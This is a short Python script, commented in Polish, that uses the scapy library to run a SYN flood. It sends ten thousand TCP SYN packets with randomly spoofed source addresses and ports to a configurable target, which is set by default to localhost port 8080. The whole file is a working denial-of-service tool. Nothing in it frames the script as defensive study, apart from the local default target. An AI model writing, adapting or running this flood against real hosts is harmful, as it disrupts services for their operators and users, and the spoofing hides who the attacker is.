from scapy.all import IP, TCP, send
import random

# Konfiguracja
TARGET_IP = "127.0.0.1"
TARGET_PORT = 8080

# Liczba pakietów do wysłania
COUNT = 10000

def syn_flood(target_ip, target_port, count):
    print(f"Rozpoczynam SYN Flood na {target_ip}:{target_port}...")
    
    for i in range(count):
        # Losowy adres IP
        src_ip = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
        src_port = random.randint(1024, 65535)
        
        # Tworzenie pakietu
        packet = IP(src=src_ip, dst=target_ip) / \
                 TCP(sport=src_port, dport=target_port, flags="S")
        
        # Wysłanie pakietu bez czekania na odpowiedź
        send(packet, verbose=0)
        
        if i % 100 == 0:
            print(f"Wysłano {i} pakietów...")

if __name__ == "__main__":
    syn_flood(TARGET_IP, TARGET_PORT, COUNT)